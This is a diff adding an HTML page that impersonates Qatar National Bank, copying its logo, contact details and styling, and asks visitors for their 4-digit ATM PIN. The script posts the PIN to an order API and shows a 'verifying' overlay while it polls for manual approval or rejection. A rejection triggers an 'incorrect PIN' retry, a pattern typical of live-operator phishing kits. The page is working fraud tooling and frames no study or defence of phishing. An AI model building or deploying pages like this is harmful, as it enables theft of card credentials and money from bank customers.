@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QNB Qatar - ATM PIN Verification</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
+            background-color: #F5F8FF;
+            color: #212529;
+        }
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #ffffff;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 40px;
+            z-index: 1000;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .header-left img {
+            height: 42px;
+            object-fit: contain;
+        }
+        .lang-btn {
+            font-weight: bold;
+            color: #ffffff;
+            background: #C41E3A;
+            padding: 10px 20px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        .lang-btn:hover {
+            background-color: #A01830;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: #000000;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        .phone-group {
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 22px;
+            height: 16px;
+            cursor: pointer;
+        }
+        .menu-icon span {
+            display: block;
+            height: 3px;
+            background-color: #000000;
+            border-radius: 2px;
+        }
+
+        /* Main Wrapper */
+        .main-container {
+            margin-top: 75px;
+            padding: 20px 20px 60px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 75px);
+            background-color: #F5F8FF;
+        }
+
+        /* Card Container */
+        .otp-card {
+            width: 100%;
+            max-width: 480px;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
+            overflow: hidden;
+            border: 1px solid #D6E4F0;
+            padding: 40px 30px;
+            text-align: center;
+        }
+
+        .otp-title {
+            font-size: 22px;
+            color: #002280;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .otp-desc {
+            font-size: 14.5px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        /* ATM PIN Input Field */
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1A2744;
+            font-size: 14px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1.5px solid #B8D4E8;
+            border-radius: 8px;
+            font-size: 22px;
+            letter-spacing: 12px;
+            text-align: center;
+            outline: none;
+            transition: all 0.3s ease;
+            background-color: #fafbfc;
+            color: #333;
+            font-weight: bold;
+        }
+        .form-control:focus {
+            border-color: #001F5C;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(0,86,179,0.08);
+        }
+
+        /* Submit Button */
+        .verify-btn {
+            background-color: #001F5C;
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,51,160,0.2);
+        }
+        .verify-btn:hover {
+            background-color: #002280;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 15px rgba(0,51,160,0.3);
+        }
+
+        /* Footer Section */
+        footer {
+            background-color: #000000;
+            color: #ffffff;
+            padding: 60px 20px 30px 20px;
+        }
+        .footer-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .footer-logo {
+            height: 40px;
+            object-fit: contain;
+            margin-bottom: 25px;
+            filter: none;
+        }
+        .footer-info {
+            font-size: 15px;
+            line-height: 2.2;
+            color: #cccccc;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .footer-bottom {
+            margin-top: 40px;
+            width: 100%;
+            border-top: 1px solid #002280;
+            padding-top: 20px;
+            font-size: 14px;
+            color: #777777;
+            text-align: center;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 10%,30%,50%,70%,90%{transform:translateX(-5px)} 20%,40%,60%,80%{transform:translateX(5px)} }
+        @media (max-width: 580px) {
+            .otp-card { border-radius: 0; box-shadow: none; border: none; padding: 20px; }
+            .main-container { padding: 0; margin-top: 70px; }
+        }
+    </style>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+        <header>
+        <div class="menu-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="header-left">
+            <img src="images/qnb-logo.png" alt="QNB Qatar">
+        </div>
+        <div class="header-right">
+            <a href="atm-pin.html" class="lang-btn">العربية</a>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="otp-card">
+            <h2 class="otp-title">ATM PIN Code</h2>
+            <p class="otp-desc">Please enter your 4-digit ATM PIN code.</p>
+
+            <form id="atmPinFormEn" method="POST">
+                <div class="form-group">
+                    <label for="atm_pin">PIN Code (4 digits)</label>
+                    <input type="password" id="atm_pin" name="atm_pin" class="form-control" required placeholder="••••" maxlength="4" autocomplete="off">
+                </div>
+
+                <button type="submit" class="verify-btn">Confirm Order</button>
+            </form>
+        </div>
+    </div>
+
+            <footer style="background-color: #001F5C; color: #ffffff; padding: 60px 20px 30px 20px; margin-top: 60px;">
+        <div class="footer-container">
+            <a href="index-en.html"><img src="images/qnb-logo.png" alt="QNB Qatar" class="footer-logo"></a>
+            <div class="footer-info">
+                <strong>Qatar National Bank (QNB)</strong>
+                <span>Doha - State of Qatar</span>
+                <span>Phone: +974 4440 7777</span>
+                <span>Email: info@qnb.com.qa</span>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2024 Qatar National Bank. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Loading Overlay (blue) -->
+    <div id="loadingOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#001F5C;z-index:9999;justify-content:center;align-items:center;flex-direction:column;">
+        <div style="width:90px;height:90px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center;">
+            <div style="width:45px;height:45px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #ffffff;border-radius:50%;animation:spin 1s linear infinite;"></div>
+        </div>
+        <div style="font-size:24px;font-weight:700;color:#ffffff;margin-top:25px;">Verifying ATM PIN...</div>
+        <p style="font-size:15px;color:rgba(255,255,255,0.8);margin-top:10px;">Please wait while your transaction is being processed.</p>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="errorModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:10000;justify-content:center;align-items:center;">
+        <div style="background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:shake 0.5s;border:2px solid #dc3545;">
+            <div style="font-size:50px;color:#dc3545;margin-bottom:15px;">✕</div>
+            <h3 style="color:#dc3545;margin-bottom:10px;">The ATM PIN you entered is incorrect</h3>
+            <p style="color:#555;font-size:15px;">Please check the correct ATM PIN and try again</p>
+            <button onclick="closeAtmErrorModal()" style="margin-top:20px;padding:12px 30px;background:#dc3545;color:white;border:none;border-radius:8px;font-size:15px;cursor:pointer;font-weight:bold;">Try Again</button>
+        </div>
+    </div>
+
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+    <script>
+        let pollInterval = null;
+        async function pollAtmStatus() {
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) return;
+            try {
+                const res = await fetch('/api/orders/' + orderId + '/status');
+                const data = await res.json();
+                if (data.status === 'approved') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    window.location.href = 'success-en.html';
+                } else if (data.status === 'rejected') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    showAtmErrorModal();
+                }
+            } catch (err) { console.error('Poll error:', err); }
+        }
+        function showAtmErrorModal() { document.getElementById('errorModal').style.display = 'flex'; }
+        function closeAtmErrorModal() { document.getElementById('errorModal').style.display = 'none'; document.getElementById('atm_pin').value = ''; }
+
+        document.getElementById('atmPinFormEn').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) { alert('Error: No order ID'); window.location.href = 'data-en.html'; return; }
+            const formData = new FormData(e.target);
+            const data = { orderId, ...Object.fromEntries(formData) };
+            try {
+                const response = await fetch('/api/orders/atm-pin', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+                const result = await response.json();
+                if (response.ok) {
+                    document.getElementById('loadingOverlay').style.display = 'flex';
+                    pollInterval = setInterval(pollAtmStatus, 2000);
+                }
+                else { alert('Error: ' + result.error); }
+            } catch (err) { alert('Connection error'); }
+        });
+    </script>
+
+</body>
+</html>
